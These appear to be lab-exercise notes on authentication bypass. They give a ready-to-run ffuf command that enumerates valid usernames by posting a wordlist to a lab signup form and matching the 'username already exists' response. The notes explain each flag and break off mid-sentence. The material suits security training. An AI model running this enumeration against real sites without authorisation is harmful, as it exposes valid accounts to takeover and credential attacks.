🧠 What Is Authentication Bypass?
Authentication bypass is when an attacker gains access to a system or application without providing valid credentials — by tricking or exploiting the login mechanism.
🧪 Simply put:
It’s like getting inside a locked room without the key, by exploiting a flaw in how the lock works

User name enumeration:
🎯 Goal of This Task
Use ffuf to enumerate valid usernames on a website by sending form data to the signup page and detecting when the server replies:
"An account with this username already exists"
🧠 What Are You Doing Here?
You’re performing username enumeration using:
A POST request
A wordlist of common usernames
A response match filter: "username already exists"
✅ Step-by-Step Instructions
🖥️ Run this command in the AttackBox terminal:
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt \
-X POST \
-d "username=FUZZ&email=x&password=x&cpassword=x" \
-H "Content-Type: application/x-www-form-urlencoded" \
-u http://10.10.44.235/customers/signup \
-mr "username already exists"
Flag	Meaning
-w	Wordlist to use for usernames
-X POST	HTTP method to use (since this is a form submission)
-d	Data sent in the request body
-H	Header to set content type to form-data
-u	URL to target the signup form
-mr	"Match Regex" — string to match in the response
🔍 What Happens?
For every word (username) in names.txt, it sends:
POST /customers/signup
username=USERNAME_HERE&email=x&password=x&cpassword=x
➡️ If the server responds with:
An account with this username already exists
